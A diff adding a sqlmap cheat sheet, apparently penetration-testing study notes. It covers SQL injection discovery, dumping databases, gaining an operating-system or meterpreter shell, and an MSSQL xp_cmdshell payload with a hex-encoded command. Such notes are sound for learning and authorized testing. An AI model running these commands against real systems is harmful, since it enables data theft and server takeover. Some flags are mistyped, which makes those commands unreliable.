@@ -1,0 +1,109 @@
+# ======================= start discovering by sqlmap ======================= #
+    # ----------- |GET requset| ----------- #
+        sqlmap -u <url_target>
+            ==> example: sqlmap -u http://sqllab.com/?id=3
+                         # to preform sql injection fuzzing on all possible parameters that found in URL.
+
+        sqlmap -u <url_target> -p <injection parameter>    
+            ==> example: sqlmap -u http://sqllab.com/?id=3 -p id
+                # to preform sql injection fuzzing on specific paramteters.
+
+    # ----------- |POST request| ----------- #
+        sqlmap -u <url_parameter> --data=<POST string> -p <injection parameter> [options]
+
+    # ----------- |determine technique| ----------- #
+        sqlmap -u <url_target> --technique=<value>
+            ==> example: sqlmap sqlmap -u http://sqllab.com/?id=3 -p id --technique=BU
+                        # using Boolean and Union (in-band) techniques to fuzzing id parameter. 
+
+            ==> options:
+                --technique=S                   # time technique.
+                --technique=U                   # union technique.
+                --technique=B                   # boolean technique.
+                | Note: you can use multiple techniques.
+            
+    # ----------- |Aggressiveness and load| ----------- #
+        sqlmap -u <url_target> --technique=<value> --level=<value>
+            
+            ==> options:
+                --level=1: is default.
+                --level=2: the cookie header.
+                --level=3: the user-agent amd referrer.
+                --level=5: the host.
+                --risk=1: default, innocuous injection.
+                --risk=2: enables heavy time-based injection.
+                --risk=3: enables OR-based injection.
+                --threads <value>: parrallel threads from 1 to 10. 
+                --keep-alive: can be used for reducing persistent connection to the target.
+
+    # ----------- |Fine tuning the payloads for detection response| ----------- #
+        sqlmap -u <url_target> -p <injection_parameters> --not-string 'nokia'
+            ==> explanation: if sqlmap find the string 'nokia' it detcts that the condition is false. 
+
+        sqlmap -u <url_target> -p <injection_parameters> --string 'nokia'
+            ==> explanation: if sqlmap find the string 'nokia' it detcts that the condition is true. 
+
+    # ----------- |Fine tuning the payloads structure| ----------- #
+        sqlmap -u <url_target> --suffix "'));" [options]
+            ==> explanation: add ')) at end of the payload
+            
+            ==> options:
+                --suffix: Injection payload suffix string
+                --prefix: Injection payload prefix string
+
+    # ----------- |attach request file| ----------- #
+        sqlmap -r <request_file> -p username
+# =======================   end discovering by sqlmap ======================= #
+
+
+# ======================= start exploit: data exfiltration ======================= #
+    # ----------- |Database Banner| ----------- #
+        sqlmap -u <url_target>  --banner [options]
+
+    # ----------- |Database users| ----------- #
+        sqlmap -u <url_target>  --users [options]
+
+    # ----------- |check if database user is adminsitrator| ----------- #
+        sqlmap -u <url_target>  --is-dba [options]
+
+    # ----------- |list all databases' names| ----------- #
+        sqlmap -u <url_target>  --dbs [options]
+
+    # ----------- |list all tables of specific database| ----------- #
+        sqlmap -u <url_target>  --D <db_name> --tables [options]
+
+    # ----------- |list all columns of specific table| ----------- #
+        sqlmap -u <url_target>  --D <db_name> -T <table_name> --columns [options]
+
+    # ----------- |dump specific column| ----------- #
+        sqlmap -u <url_target>  --D <db_name> -T <table_name> -C <col_names> dump [options]
+# =======================   end exploit: data exfiltration ======================= #
+
+# ======================= start exploit: system takeover ======================= #
+    # ----------- |exploit with os-pwn| ----------- #
+        sqlmap -r hackme.txt -p txtUserName --dbms=MSSQL --technique=S --os-pwn
+            ==> 1 [Enter].          # choose interactive meterpreter shell.
+            ==>
+
+    ==> operating system access options:
+        --os-cmd=OSCMD              # execute an operating system command.
+        --os-shell                  # prompt for an interactive operating system shell.
+        --os-pwn                    # prompt for an out-of-band shellm meterpreter or VNC.
+        --os-smbrelay               # one click prompt for an OOB shell, meterpreter or VNC.
+        --priv-esc                  # Database process' user privilege escalation.
+        --msf-path=MSFPATH          # local path where metasploit framework is installed.
+        --tmp-path=TMPPATH          # remote absolute path of temporary files directory.
+# =======================   end exploit: system takeover ======================= #
+
+# ======================= start exploit: storing Command result into a temporary table ======================= #
+    # ----------- |exploit: MSSQL| ----------- #
+        CREATE TABLE temptable (id int not null identitiy (1,1), output nvarchar(4096) null);--+-
+            ==> explanation:
+                # id column will hep us to access different command output.
+                # output column will contain the actual output.
+
+        DECLARE @t NVARCHAR(4096) set @t=0x640069007200200063003a005c00 INSERT INTO temptable (output) EXEC master.dbo.xp_cmdshell @t;
+            ==> explanation:
+                # declere variable @t=0x640069007200200063003a005c00 which hex decimal equal to 'dir c:\'
+                # execute the variable then storing the output into temptable.
+# =======================   end exploit: storing Command result into a temporary table ======================= #
